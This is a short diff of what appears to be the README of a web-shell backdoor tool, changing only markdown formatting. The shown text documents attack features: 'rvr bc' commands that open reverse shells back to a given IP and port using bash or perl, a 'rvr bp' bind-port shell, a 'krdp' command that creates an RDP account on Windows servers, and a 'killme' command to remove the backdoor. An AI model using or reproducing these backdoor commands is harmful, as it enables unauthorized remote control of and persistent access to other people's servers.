@@ -49,30 +49,32 @@ usage: idxconfig
  - Symlink 
  usage: symlink
 
- - Reverse Shell 
- [Back Connect]
- usage: rvr bc [IP] [PORT] [TYPE]
- example:
- ~~~
- rvr bc 127.0.0.1 1337 bash
- rvr bc 127.0.0.1 1337 perl
+ - ***Reverse Shell***
+***[Back Connect]***
+usage: rvr bc [IP] [PORT] [TYPE]
+example:
+~~~
+rvr bc 127.0.0.1 1337 bash
+rvr bc 127.0.0.1 1337 perl
 ~~~
 
- [Bind Port]
- usage: rvr bp [PORT] [TYPE]
- example:
+***Bind Port***
+usage: rvr bp [PORT] [TYPE]
+example:
 ~~
- rvr bp 1337 perl
+rvr bp 1337 perl
 ~~
 
- - KRDP - Create RDP Account (for windows server only) 
+ - ***KRDP - Create RDP Account (for windows server only)***
+ 
  usage: krdp
 
- ***Logout From Shell***
- usage: 
- logout
+ - ***Logout From Shell***
+ 
+ usage: logout
 
- ***Kill Backdoor***
+ - ***Kill Backdoor***
+
 usage: killme
 
  ## Contribute
